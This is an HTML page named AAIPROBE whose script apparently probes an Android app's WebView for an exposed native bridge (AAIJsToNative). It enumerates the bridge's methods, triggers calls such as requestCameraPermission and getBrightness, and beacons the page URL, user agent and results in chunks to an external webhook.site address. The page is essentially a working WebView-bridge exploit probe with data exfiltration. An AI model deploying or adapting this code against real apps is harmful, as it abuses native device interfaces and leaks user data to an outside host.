<!doctype html><html><head><meta charset="utf-8"><title>AAIPROBE</title></head>
<body style="font:16px monospace;padding:12px"><h3>AAIPROBE</h3><pre id="o">running</pre>
<script>
var HOOK='https://webhook.site/effa7939-7d74-4aa7-a1c5-0037df4dd305';
function send(tag,s){s=String(s);for(var i=0;i<s.length;i+=1100){try{new Image().src=HOOK+'?tag='+tag+'&i='+i+'&d='+encodeURIComponent(s.substr(i,1100));}catch(e){}}if(!s.length){try{new Image().src=HOOK+'?tag='+tag+'&d=';}catch(e){}}}
function log(x){try{document.getElementById('o').textContent+='\n'+x}catch(e){}}
var out={href:location.href,ua:navigator.userAgent};
try{ out.keys=Object.getOwnPropertyNames(window).filter(function(k){return /AAI|ative|bridge|Bridge|Android/i.test(k)}); }catch(e){}
var a=window.AAIJsToNative;
out.hasBridge = (typeof a !== 'undefined');
if(out.hasBridge){
  try{ out.methods=Object.getOwnPropertyNames(a); }catch(e){ out.methods='ERR '+e; }
  try{ if(a.isGallerySupportedOnAndroid) out.gallery=String(a.isGallerySupportedOnAndroid()); }catch(e){ out.gallery='ERR '+e; }
  try{ a.onFinished && (window.__aaiFinished = true); }catch(e){}
}
send('AAI', JSON.stringify(out)); log('AAI '+JSON.stringify(out));
setTimeout(function(){
  var res={};
  try{ if(a && a.requestCameraPermission){ a.requestCameraPermission(); res.camReq='called'; } }catch(e){ res.camReq='ERR '+e; }
  try{ if(a && a.getBrightness){ a.getBrightness(JSON.stringify({finishCallback:'window.__bright'})); } }catch(e){ res.bright='ERR '+e; }
  res.brightVal = String(window.__bright||'');
  send('AAI2', JSON.stringify(res)); log('AAI2 '+JSON.stringify(res));
},2500);
</script></body></html>
